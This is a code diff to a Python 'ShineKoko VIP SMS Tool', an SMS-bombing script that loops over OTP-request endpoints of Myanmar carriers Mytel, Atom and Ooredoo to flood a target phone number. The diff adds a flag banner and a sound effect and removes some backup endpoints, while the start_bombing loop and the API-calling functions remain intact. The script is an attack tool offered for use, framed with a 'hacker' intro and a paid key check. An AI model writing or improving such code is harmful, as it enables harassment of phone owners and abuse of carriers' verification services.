@@ -16,8 +16,22 @@ C = "\033[1;36m"
 M = "\033[1;35m"
 X = "\033[0m"
 
+# Myanmar Flag ASCII
+MYANMAR_FLAG = f"""
+{Y}████████████████████████████████████████
+{G}███████████████████{W}★{G}███████████████████
+{R}████████████████████████████████████████{X}
+"""
+
 def clear_screen():
     os.system('cls' if platform.system() == 'Windows' else 'clear')
+
+def play_sound():
+    try:
+        # Play a simple beep sound in Termux
+        os.system('termux-vibrate -d 100')
+        os.system('play-audio /system/media/audio/ui/KeypressStandard.ogg > /dev/null 2>&1')
+    except: pass
 
 def typewriter(text, speed=0.03):
     for char in text:
@@ -26,16 +40,9 @@ def typewriter(text, speed=0.03):
         time.sleep(speed)
     print()
 
-def transition_anim():
-    sys.stdout.write(f"\n{G}[*] Redirecting")
-    for _ in range(3):
-        time.sleep(0.2)
-        sys.stdout.write(".")
-        sys.stdout.flush()
-    print(f"{X}")
-
 def hacker_intro():
     clear_screen()
+    print(MYANMAR_FLAG)
     print(G) 
     ascii_art = r"""
     ███████╗██╗  ██╗██╗███╗   ██╗███████╗██╗  ██╗ ██████╗ ██╗  ██╗ ██████╗ 
@@ -46,6 +53,7 @@ def hacker_intro():
     ╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ 
     """
     print(ascii_art)
+    play_sound()
     time.sleep(0.5)
     print(f"{W}[*]{G} INITIALIZING CORE SYSTEMS... [OK]")
     print(f"{W}[*]{G} ESTABLISHING SECURE CONNECTION... [SUCCESS]")
@@ -97,7 +105,8 @@ def banner():
     print(r" \___ \| |_| || ||  \| |  _|   | ' / | | | ' / | | |")
     print(r"  ___) |  _  || || |\  | |___  | . \ |_| | . \ |_| |")
     print(r" |____/|_| |_|___|_| \_|_____| |_|\_\___/|_|\_\___/ ")
-    print(f"\n          {Y}>>> {W}ShineKoko VIP SMS Tool {Y}<<<{X}")
+    print(MYANMAR_FLAG)
+    print(f"          {Y}>>> {W}ShineKoko VIP SMS Tool {Y}<<<{X}")
     print(f"{W}╔══════════════════════════════════════════════════╗")
     d_id = get_id()
     model = get_model()
@@ -166,29 +175,22 @@ def auth(d_id, model):
         print(f"{R}[!] Invalid Key!{X}")
         time.sleep(2)
 
-# --- UPDATED SMS API FUNCTIONS ---
+# --- SMS API FUNCTIONS ---
 def call_mytel(phone):
     try:
-        # Working Mytel API
         requests.get(f"https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={phone}", timeout=5)
     except: pass
 
 def call_atom(phone):
     try:
-        # Updated Atom (Telenor) API
         headers = {'User-Agent': 'Mozilla/5.0'}
         requests.get(f"https://www.atom.com.mm/api/otp/send?msisdn={phone}", headers=headers, timeout=5)
-        # Backup Atom API
-        requests.post("https://api.atom.com.mm/v1/otp/send", json={"msisdn": phone}, timeout=5)
     except: pass
 
 def call_ooredoo(phone):
     try:
-        # Updated Ooredoo API
         headers = {'Content-Type': 'application/json'}
         requests.post("https://www.ooredoo.com.mm/api/v1/otp/send", json={"phone": phone}, headers=headers, timeout=5)
-        # Backup Ooredoo API
-        requests.get(f"https://www.ooredoo.com.mm/api/otp?phone={phone}", timeout=5)
     except: pass
 
 def start_bombing(p, c, op):
@@ -204,7 +206,7 @@ def start_bombing(p, c, op):
                 call_ooredoo(p)
         except: pass
         loading_bar(i + 1, c)
-        time.sleep(0.5) # Original Speed
+        time.sleep(0.5)
     print(f"\n{G}[+] Finished!{X}")
     input(f"\n{W}Press Enter to return...{X}")
 
